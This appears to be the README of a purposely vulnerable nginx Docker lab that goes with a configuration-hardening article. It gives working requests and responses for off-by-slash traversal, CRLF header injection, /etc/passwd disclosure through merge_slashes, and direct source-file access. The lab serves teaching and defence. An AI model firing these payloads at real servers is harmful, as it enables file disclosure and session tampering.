# Nginx Configuration Hardening

This repository implements a vulnerable nginx server.
It's an example for the article: https://unbonhacker.com/posts/nginx-configuration-hardening


## Installation

```bash
docker build --no-cache -t nginx-test-hardening:latest .
docker rm --force `docker ps --no-trunc -aq --filter "name=nginx-test-hardening"`
docker run -d -p 8000:80 --name nginx-test-hardening nginx-test-hardening:lastest
```

## Examples

### Off-By-Slash

Static file:
```
http://localhost:8000/static/robots.txt
```

Application source code:

```
http://localhost:8000/static../app.py
```


### CRLF injection via $uri

Request is:

```
GET /crlf%0d%0aSet-Cookie:%20auth=test HTTP/1.1
Host: 127.0.0.1:8000
```

Response is:

```http
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 12 Apr 2022 09:39:22 GMT
Content-Type: text/html
Content-Length: 154
Connection: close
Location: http://localhost//crlf
Set-Cookie: auth=test
```

### merge_slashses off

Request is:

```
GET //////../../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1:8000
```

Response containes the file `/etc/passwd`:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/octet-stream
Content-Length: 926
Connection: close
Content-Disposition: inline; filename=passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

### Direct access to file

Request is:

```
GET /app.py HTTP/1.1
Host: 127.0.0.1:8000
```

Response is the application file `app.py`

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/octet-stream
Content-Length: 208


from flask import Flask, send_file

app = Flask(__name__)
...
```
